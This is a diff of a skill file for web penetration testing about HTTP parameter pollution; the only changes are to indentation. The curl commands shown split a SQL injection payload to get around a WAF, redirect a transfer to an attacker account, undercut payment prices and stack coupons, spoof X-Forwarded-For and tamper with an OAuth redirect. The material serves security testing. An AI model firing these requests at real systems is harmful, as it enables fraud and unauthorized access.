@@ -1,10 +1,10 @@
 ---
 name: performing-http-parameter-pollution-attack
 description: Executes HTTP Parameter Pollution attacks that inject duplicate request
-  parameters to bypass input validation, WAF rules, and other security controls when
-  front-end and back-end systems parse duplicate parameters differently. Use during
-  web application penetration testing to test for parameter parsing inconsistencies
-  or WAF/validation bypass.
+ parameters to bypass input validation, WAF rules, and other security controls when
+ front-end and back-end systems parse duplicate parameters differently. Use during
+ web application penetration testing to test for parameter parsing inconsistencies
+ or WAF/validation bypass.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -67,25 +67,25 @@ curl -v "http://target.com/search?q=first&q=second"
 
 # Test POST body duplicate parameters
 curl -X POST http://target.com/api/action \
-  -d "amount=100&amount=1"
+ -d "amount=100&amount=1"
 ```
 
 ### Step 2 — Perform Server-Side HPP
 ```bash
 # Bypass input validation by splitting payload
 # Original blocked payload: id=1 OR 1=1
-curl "http://target.com/api/user?id=1%20OR%201%3D1"  # Blocked by WAF
+curl "http://target.com/api/user?id=1%20OR%201%3D1" # Blocked by WAF
 
 # HPP bypass: split across duplicate parameters
-curl "http://target.com/api/user?id=1%20OR&id=1%3D1"  # May bypass WAF
+curl "http://target.com/api/user?id=1%20OR&id=1%3D1" # May bypass WAF
 
 # Parameter pollution in POST body
 curl -X POST http://target.com/transfer \
-  -d "to_account=victim&amount=100&to_account=attacker"
+ -d "to_account=victim&amount=100&to_account=attacker"
 
 # Override security-critical parameters
 curl -X POST http://target.com/api/payment \
-  -d "price=99.99&currency=USD&price=0.01"
+ -d "price=99.99&currency=USD&price=0.01"
 ```
 
 ### Step 3 — Perform Client-Side HPP
@@ -93,7 +93,7 @@ curl -X POST http://target.com/api/payment \
 # Client-side HPP via URL manipulation
 # If application reflects parameters in links:
 # Original: http://target.com/page?param=value
-# Inject:   http://target.com/page?param=value%26injected_param=evil_value
+# Inject: http://target.com/page?param=value%26injected_param=evil_value
 
 # Social sharing URL manipulation
 curl "http://target.com/share?url=http://legit.com%26callback=http://evil.com"
@@ -116,8 +116,8 @@ curl "http://target.com/api/data?filter=admin%26role=superadmin"
 
 # HPP in HTTP headers
 curl -H "X-Forwarded-For: 127.0.0.1" \
-     -H "X-Forwarded-For: attacker-ip" \
-     http://target.com/api/admin
+ -H "X-Forwarded-For: attacker-ip" \
+ http://target.com/api/admin
 ```
 
 ### Step 5 — Test OAuth and Payment Flow HPP
@@ -128,11 +128,11 @@ curl "http://target.com/oauth/authorize?client_id=legit&redirect_uri=https://leg
 
 # Payment amount manipulation
 curl -X POST http://target.com/api/checkout \
-  -d "item=product1&price=100&quantity=1&price=1"
+ -d "item=product1&price=100&quantity=1&price=1"
 
 # Coupon code HPP
 curl -X POST http://target.com/api/apply-coupon \
-  -d "coupon=SAVE10&coupon=SAVE90&coupon=FREE"
+ -d "coupon=SAVE10&coupon=SAVE90&coupon=FREE"
 ```
 
 ### Step 6 — Automate HPP Testing
@@ -143,11 +143,11 @@ curl -X POST http://target.com/api/apply-coupon \
 
 # Test with OWASP ZAP HPP scanner
 zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' \
-  http://target.com
+ http://target.com
 
 # Custom testing with Python
 python3 hpp_tester.py --url http://target.com/api/action \
-  --params "id,role,amount" --method POST
+ --params "id,role,amount" --method POST
 ```
 
 ## Key Concepts
